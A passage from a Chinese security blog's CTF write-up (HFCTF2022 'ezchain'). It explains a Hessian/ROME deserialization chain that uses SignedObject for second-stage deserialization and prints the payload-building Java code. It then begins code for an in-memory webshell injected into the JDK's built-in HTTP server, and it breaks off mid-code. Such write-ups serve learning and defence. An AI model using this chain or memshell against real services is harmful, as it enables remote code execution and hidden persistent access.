<!DOCTYPE html>
<html lang="en-us">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> Hessian二次反序列化与JDK自带HTTP库的内存马 | Hello World</title>
  <link rel = 'canonical' href = 'https://bikeknight.top/posts/hessianmemshell/'>
  <meta name="description" content="Do not go gentle into that good night.">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="Hessian二次反序列化与JDK自带HTTP库的内存马" />
<meta property="og:description" content="HFCTF2022 ezchain 二次反序列化 这道题反序列化使用的是 Hessian ，依赖给的是 ROME ，这两个组合最常见的利用方式就是以 JDBCRowSetImpl 为 sink 的JNDI注入，但是这道题目不出网，最开始想到的解决方法是用 TemplatesImpl 为sink，但是很快发现是不可用的，具体原因为：TemplatesImpl 的 _tfactory 字段为 transient 修饰 ，在序列化的过程中会被忽略，和Java原生反序列化不同的是，Hessian 反序列化的时候并不会将这个字段还原，在 defineTransletClasses() 方法中无法将 _bytecodes 中所携带的恶意类的字节码加载到JVM中，最后无法完成实例化。
但是 Hessian 和 ROME 还是可以完成 getter 方法调用的，现在问题就变成了「可以调用一个类的 getter 方法，如何完成反序列化 RCE？」，在比赛期间是思路是使用 BCEL ClassLoader 或者二次反序列化来做，但是并没有找到合适的 getter 方法，现在想来是比较遗憾的。
题目的正确做法是使用 java.security.SignedObject 来构造二次反序列化，它可以包装一个序列化对象，对其进行加密签名，反序列化的时候可以验证其是否被修改。它的 getObject() 方法：
public Object getObject() throws IOException, ClassNotFoundException {  // creating a stream pipe-line, from b to a  ByteArrayInputStream b = new ByteArrayInputStream(this.content);  ObjectInput a = new ObjectInputStream(b);  Object obj = a." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bikeknight.top/posts/hessianmemshell/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-03-21T16:32:04+08:00" />
<meta property="article:modified_time" content="2022-03-21T16:32:04+08:00" />


  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Hessian二次反序列化与JDK自带HTTP库的内存马"/>
<meta name="twitter:description" content="HFCTF2022 ezchain 二次反序列化 这道题反序列化使用的是 Hessian ，依赖给的是 ROME ，这两个组合最常见的利用方式就是以 JDBCRowSetImpl 为 sink 的JNDI注入，但是这道题目不出网，最开始想到的解决方法是用 TemplatesImpl 为sink，但是很快发现是不可用的，具体原因为：TemplatesImpl 的 _tfactory 字段为 transient 修饰 ，在序列化的过程中会被忽略，和Java原生反序列化不同的是，Hessian 反序列化的时候并不会将这个字段还原，在 defineTransletClasses() 方法中无法将 _bytecodes 中所携带的恶意类的字节码加载到JVM中，最后无法完成实例化。
但是 Hessian 和 ROME 还是可以完成 getter 方法调用的，现在问题就变成了「可以调用一个类的 getter 方法，如何完成反序列化 RCE？」，在比赛期间是思路是使用 BCEL ClassLoader 或者二次反序列化来做，但是并没有找到合适的 getter 方法，现在想来是比较遗憾的。
题目的正确做法是使用 java.security.SignedObject 来构造二次反序列化，它可以包装一个序列化对象，对其进行加密签名，反序列化的时候可以验证其是否被修改。它的 getObject() 方法：
public Object getObject() throws IOException, ClassNotFoundException {  // creating a stream pipe-line, from b to a  ByteArrayInputStream b = new ByteArrayInputStream(this.content);  ObjectInput a = new ObjectInputStream(b);  Object obj = a."/>

  
  
    
  
  
  <link rel="stylesheet" href="https://bikeknight.top/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://bikeknight.top/images/favicon.ico" />

  
  
  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">All posts</a></li>
         
        <li><a href="/tags">Tags</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://bikeknight.top/posts/thebatman/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://bikeknight.top/posts/spring-core-rce/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&text=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&title=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&is_video=false&description=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac&body=Check out this article: https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&title=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&title=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&name=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac&description=HFCTF2022%20ezchain%20%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%20%e8%bf%99%e9%81%93%e9%a2%98%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%bd%bf%e7%94%a8%e7%9a%84%e6%98%af%20Hessian%20%ef%bc%8c%e4%be%9d%e8%b5%96%e7%bb%99%e7%9a%84%e6%98%af%20ROME%20%ef%bc%8c%e8%bf%99%e4%b8%a4%e4%b8%aa%e7%bb%84%e5%90%88%e6%9c%80%e5%b8%b8%e8%a7%81%e7%9a%84%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f%e5%b0%b1%e6%98%af%e4%bb%a5%20JDBCRowSetImpl%20%e4%b8%ba%20sink%20%e7%9a%84JNDI%e6%b3%a8%e5%85%a5%ef%bc%8c%e4%bd%86%e6%98%af%e8%bf%99%e9%81%93%e9%a2%98%e7%9b%ae%e4%b8%8d%e5%87%ba%e7%bd%91%ef%bc%8c%e6%9c%80%e5%bc%80%e5%a7%8b%e6%83%b3%e5%88%b0%e7%9a%84%e8%a7%a3%e5%86%b3%e6%96%b9%e6%b3%95%e6%98%af%e7%94%a8%20TemplatesImpl%20%e4%b8%basink%ef%bc%8c%e4%bd%86%e6%98%af%e5%be%88%e5%bf%ab%e5%8f%91%e7%8e%b0%e6%98%af%e4%b8%8d%e5%8f%af%e7%94%a8%e7%9a%84%ef%bc%8c%e5%85%b7%e4%bd%93%e5%8e%9f%e5%9b%a0%e4%b8%ba%ef%bc%9aTemplatesImpl%20%e7%9a%84%20_tfactory%20%e5%ad%97%e6%ae%b5%e4%b8%ba%20transient%20%e4%bf%ae%e9%a5%b0%20%ef%bc%8c%e5%9c%a8%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e8%bf%87%e7%a8%8b%e4%b8%ad%e4%bc%9a%e8%a2%ab%e5%bf%bd%e7%95%a5%ef%bc%8c%e5%92%8cJava%e5%8e%9f%e7%94%9f%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8d%e5%90%8c%e7%9a%84%e6%98%af%ef%bc%8cHessian%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e6%97%b6%e5%80%99%e5%b9%b6%e4%b8%8d%e4%bc%9a%e5%b0%86%e8%bf%99%e4%b8%aa%e5%ad%97%e6%ae%b5%e8%bf%98%e5%8e%9f%ef%bc%8c%e5%9c%a8%20defineTransletClasses%28%29%20%e6%96%b9%e6%b3%95%e4%b8%ad%e6%97%a0%e6%b3%95%e5%b0%86%20_bytecodes%20%e4%b8%ad%e6%89%80%e6%90%ba%e5%b8%a6%e7%9a%84%e6%81%b6%e6%84%8f%e7%b1%bb%e7%9a%84%e5%ad%97%e8%8a%82%e7%a0%81%e5%8a%a0%e8%bd%bd%e5%88%b0JVM%e4%b8%ad%ef%bc%8c%e6%9c%80%e5%90%8e%e6%97%a0%e6%b3%95%e5%ae%8c%e6%88%90%e5%ae%9e%e4%be%8b%e5%8c%96%e3%80%82%0a%e4%bd%86%e6%98%af%20Hessian%20%e5%92%8c%20ROME%20%e8%bf%98%e6%98%af%e5%8f%af%e4%bb%a5%e5%ae%8c%e6%88%90%20getter%20%e6%96%b9%e6%b3%95%e8%b0%83%e7%94%a8%e7%9a%84%ef%bc%8c%e7%8e%b0%e5%9c%a8%e9%97%ae%e9%a2%98%e5%b0%b1%e5%8f%98%e6%88%90%e4%ba%86%e3%80%8c%e5%8f%af%e4%bb%a5%e8%b0%83%e7%94%a8%e4%b8%80%e4%b8%aa%e7%b1%bb%e7%9a%84%20getter%20%e6%96%b9%e6%b3%95%ef%bc%8c%e5%a6%82%e4%bd%95%e5%ae%8c%e6%88%90%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%20RCE%ef%bc%9f%e3%80%8d%ef%bc%8c%e5%9c%a8%e6%af%94%e8%b5%9b%e6%9c%9f%e9%97%b4%e6%98%af%e6%80%9d%e8%b7%af%e6%98%af%e4%bd%bf%e7%94%a8%20BCEL%20ClassLoader%20%e6%88%96%e8%80%85%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9d%a5%e5%81%9a%ef%bc%8c%e4%bd%86%e6%98%af%e5%b9%b6%e6%b2%a1%e6%9c%89%e6%89%be%e5%88%b0%e5%90%88%e9%80%82%e7%9a%84%20getter%20%e6%96%b9%e6%b3%95%ef%bc%8c%e7%8e%b0%e5%9c%a8%e6%83%b3%e6%9d%a5%e6%98%af%e6%af%94%e8%be%83%e9%81%97%e6%86%be%e7%9a%84%e3%80%82%0a%e9%a2%98%e7%9b%ae%e7%9a%84%e6%ad%a3%e7%a1%ae%e5%81%9a%e6%b3%95%e6%98%af%e4%bd%bf%e7%94%a8%20java.security.SignedObject%20%e6%9d%a5%e6%9e%84%e9%80%a0%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%ef%bc%8c%e5%ae%83%e5%8f%af%e4%bb%a5%e5%8c%85%e8%a3%85%e4%b8%80%e4%b8%aa%e5%ba%8f%e5%88%97%e5%8c%96%e5%af%b9%e8%b1%a1%ef%bc%8c%e5%af%b9%e5%85%b6%e8%bf%9b%e8%a1%8c%e5%8a%a0%e5%af%86%e7%ad%be%e5%90%8d%ef%bc%8c%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e6%97%b6%e5%80%99%e5%8f%af%e4%bb%a5%e9%aa%8c%e8%af%81%e5%85%b6%e6%98%af%e5%90%a6%e8%a2%ab%e4%bf%ae%e6%94%b9%e3%80%82%e5%ae%83%e7%9a%84%20getObject%28%29%20%e6%96%b9%e6%b3%95%ef%bc%9a%0apublic%20Object%20getObject%28%29%20throws%20IOException%2c%20ClassNotFoundException%20%7b%20%20%2f%2f%20creating%20a%20stream%20pipe-line%2c%20from%20b%20to%20a%20%20ByteArrayInputStream%20b%20%3d%20new%20ByteArrayInputStream%28this.content%29%3b%20%20ObjectInput%20a%20%3d%20new%20ObjectInputStream%28b%29%3b%20%20Object%20obj%20%3d%20a." aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&t=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#二次反序列化">二次反序列化</a></li>
    <li><a href="#内存马">内存马</a></li>
    <li><a href="#思考">思考</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        Hessian二次反序列化与JDK自带HTTP库的内存马
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2022-03-21 16:32:04 &#43;0800 CST" itemprop="datePublished">2022-03-21</time>
          
        </div>
        
        
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/java%E5%AE%89%E5%85%A8" rel="tag">Java安全</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <h1 id="hfctf2022-ezchain">HFCTF2022 ezchain</h1>
<h2 id="二次反序列化">二次反序列化</h2>
<p>这道题反序列化使用的是 Hessian ，依赖给的是 ROME ，这两个组合最常见的利用方式就是以 JDBCRowSetImpl 为 sink 的JNDI注入，但是这道题目不出网，最开始想到的解决方法是用 <code>TemplatesImpl</code> 为sink，但是很快发现是不可用的，具体原因为：<code>TemplatesImpl</code> 的 <code>_tfactory</code> 字段为<code> transient</code> 修饰 ，在序列化的过程中会被忽略，和Java原生反序列化不同的是，Hessian 反序列化的时候并不会将这个字段还原，在 <code>defineTransletClasses()</code> 方法中无法将 <code>_bytecodes</code> 中所携带的恶意类的字节码加载到JVM中，最后无法完成实例化。</p>
<p>但是 Hessian 和 ROME 还是可以完成 getter 方法调用的，现在问题就变成了「可以调用一个类的 <code>getter</code> 方法，如何完成反序列化 RCE？」，在比赛期间是思路是使用 <code>BCEL ClassLoader</code> 或者二次反序列化来做，但是并没有找到合适的 <code>getter</code> 方法，现在想来是比较遗憾的。</p>
<p>题目的正确做法是使用 <code>java.security.SignedObject</code> 来构造二次反序列化，它可以包装一个序列化对象，对其进行加密签名，反序列化的时候可以验证其是否被修改。它的 <code>getObject()</code> 方法：</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> Object <span style="color:#447fcf">getObject</span>() <span style="color:#6ab825;font-weight:bold">throws</span> IOException, ClassNotFoundException {
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// creating a stream pipe-line, from b to a
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    ByteArrayInputStream b = <span style="color:#6ab825;font-weight:bold">new</span> ByteArrayInputStream(<span style="color:#6ab825;font-weight:bold">this</span>.<span style="color:#bbb">content</span>);
</span></span><span style="display:flex;"><span>    ObjectInput a = <span style="color:#6ab825;font-weight:bold">new</span> ObjectInputStream(b);
</span></span><span style="display:flex;"><span>    Object obj = a.<span style="color:#bbb">readObject</span>();
</span></span><span style="display:flex;"><span>    b.<span style="color:#bbb">close</span>();
</span></span><span style="display:flex;"><span>    a.<span style="color:#bbb">close</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> obj;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>this.content</code> 可以在构造方法中传入，完美达到了要求：</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#447fcf">SignedObject</span>(Serializable object, PrivateKey signingKey,
</span></span><span style="display:flex;"><span>										Signature signingEngine)
</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">throws</span> IOException, InvalidKeyException, SignatureException {
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// creating a stream pipe-line, from a to b
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    ByteArrayOutputStream b = <span style="color:#6ab825;font-weight:bold">new</span> ByteArrayOutputStream();
</span></span><span style="display:flex;"><span>    ObjectOutput a = <span style="color:#6ab825;font-weight:bold">new</span> ObjectOutputStream(b);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// write and flush the object content to byte array
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    a.<span style="color:#bbb">writeObject</span>(object);
</span></span><span style="display:flex;"><span>    a.<span style="color:#bbb">flush</span>();
</span></span><span style="display:flex;"><span>    a.<span style="color:#bbb">close</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">this</span>.<span style="color:#bbb">content</span> = b.<span style="color:#bbb">toByteArray</span>();
</span></span><span style="display:flex;"><span>    b.<span style="color:#bbb">close</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// now sign the encapsulated object
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">this</span>.<span style="color:#bbb">sign</span>(signingKey, signingEngine);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>利用 Hessian 触发 <code>getObject()</code> 方法，之后使用原生反序列化中的 <code>ROME</code> 链就可以了：</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Signature signature = Signature.<span style="color:#bbb">getInstance</span>(<span style="color:#ed9d13">&#34;SHA1WithRSA&#34;</span>);  
</span></span><span style="display:flex;"><span>KeyPairGenerator kpg = KeyPairGenerator.<span style="color:#bbb">getInstance</span>(<span style="color:#ed9d13">&#34;RSA&#34;</span>);  
</span></span><span style="display:flex;"><span>KeyPair kp = kpg.<span style="color:#bbb">generateKeyPair</span>();  
</span></span><span style="display:flex;"><span>SignedObject exploit = <span style="color:#6ab825;font-weight:bold">new</span> SignedObject((Serializable) generateRome(), kp.<span style="color:#bbb">getPrivate</span>(), signature);
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>ToStringBean toStringBean = <span style="color:#6ab825;font-weight:bold">new</span> ToStringBean(SignedObject.<span style="color:#bbb">class</span>, exploit);  
</span></span><span style="display:flex;"><span>EqualsBean equalsBean = <span style="color:#6ab825;font-weight:bold">new</span> EqualsBean(toStringBean.<span style="color:#bbb">getClass</span>(), toStringBean);  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>HashMap hashMap = <span style="color:#6ab825;font-weight:bold">new</span> HashMap&lt;&gt;(1);  
</span></span><span style="display:flex;"><span>hashMap.<span style="color:#bbb">put</span>(<span style="color:#ed9d13">&#34;foo&#34;</span>, <span style="color:#ed9d13">&#34;foo&#34;</span>);  
</span></span><span style="display:flex;"><span>Object[] hashMapTable = (Object[]) SerUtil.<span style="color:#bbb">getFiledValue</span>(hashMap, <span style="color:#ed9d13">&#34;table&#34;</span>);  
</span></span><span style="display:flex;"><span>Object hashMapNode = hashMapTable[1];  
</span></span><span style="display:flex;"><span>SerUtil.<span style="color:#bbb">setFieldValue</span>(hashMapNode, <span style="color:#ed9d13">&#34;key&#34;</span>, equalsBean);  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>ByteArrayOutputStream baos = <span style="color:#6ab825;font-weight:bold">new</span> ByteArrayOutputStream();  
</span></span><span style="display:flex;"><span>Hessian2Output h2o = <span style="color:#6ab825;font-weight:bold">new</span> Hessian2Output(baos);  
</span></span><span style="display:flex;"><span>h2o.<span style="color:#bbb">writeObject</span>(hashMap);  
</span></span><span style="display:flex;"><span>h2o.<span style="color:#bbb">flush</span>();
</span></span></code></pre></div><h2 id="内存马">内存马</h2>
<p>题目不出网，要想获得命令执行的回显就需要构造内存马或者操作 <code>linux socket</code> 描述符，题目使用了 JDK 自带了 <code>httpserver</code> 库来搭建 HTTP 服务，这个库并不复杂，所以我觉得可以研究一下内存马的可行性。</p>
<p>从 Tomcat 内存马的学习经验来看，反射的起点一般是 <code>静态变量</code> 或者 <code>Thread</code> 中隐藏的信息，自带的 HTTP 库的核心实现是在 <code>sun.net.httpserver.ServerImpl</code> 中，并没有什么可用的静态变量，然后发现启动 HTTP 服务的 <code>start()</code> 方法是将一个 <code>dispatcher</code> 对象作为 target 启动了一个新的线程：</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">start</span> () {
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!bound || started || finished) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">throw</span> <span style="color:#6ab825;font-weight:bold">new</span> IllegalStateException (<span style="color:#ed9d13">&#34;server in wrong state&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (executor == <span style="color:#6ab825;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>        executor = <span style="color:#6ab825;font-weight:bold">new</span> DefaultExecutor();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    Thread t = <span style="color:#6ab825;font-weight:bold">new</span> Thread (dispatcher);
</span></span><span style="display:flex;"><span>    started = <span style="color:#6ab825;font-weight:bold">true</span>;
</span></span><span style="display:flex;"><span>    t.<span style="color:#bbb">start</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这个 <code>dispatcher</code> 对应的类是 <code>sun.net.httpserver.ServerImpl$Dispatcher</code>  ，作为 <code>ServerImpl</code> 中的非静态内部类，其实 <code>dispatcher</code> 内部是有一个指向外层类（对象）的 <code>this$0</code> 变量的，所以我们可以通过获取 <code>HTTP</code> 服务对应的线程，获取其 <code>target</code> ，然后再拿到 <code>this$0</code> 变量，这样后续就十分简单了。</p>
<p>获取到 <code>ServerImpl</code> 对象之后，只需要反射调用 <code>createContext(String.class, HttpHandler.class)</code> 就可以完成 <code>handler</code> 的动态添加，总体实现并不难：</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">private</span> <span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">generateMemShell</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>        ThreadGroup group = Thread.<span style="color:#bbb">currentThread</span>().<span style="color:#bbb">getThreadGroup</span>();
</span></span><span style="display:flex;"><span>        Field threads = Class.<span style="color:#bbb">forName</span>(<span style="color:#ed9d13">&#34;java.lang.ThreadGroup&#34;</span>).<span style="color:#bbb">getDeclaredField</span>(<span style="color:#ed9d13">&#34;threads&#34;</span>);
</span></span><span style="display:flex;"><span>        threads.<span style="color:#bbb">setAccessible</span>(<span style="color:#6ab825;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        Thread[] threads_dest = (Thread[]) threads.<span style="color:#bbb">get</span>(group);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Field target = Class.<span style="color:#bbb">forName</span>(<span style="color:#ed9d13">&#34;java.lang.Thread&#34;</span>).<span style="color:#bbb">getDeclaredField</span>(<span style="color:#ed9d13">&#34;target&#34;</span>);
</span></span><span style="display:flex;"><span>        target.<span style="color:#bbb">setAccessible</span>(<span style="color:#6ab825;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        Object target_dest = <span style="color:#6ab825;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">for</span> (Thread thread : threads_dest) {
</span></span><span style="display:flex;"><span>            Object target_temp = target.<span style="color:#bbb">get</span>(thread);
</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">if</span> (target_temp != <span style="color:#6ab825;font-weight:bold">null</span> &amp;&amp; target_temp.<span style="color:#bbb">getClass</span>().<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Dispatcher&#34;</span>)) {
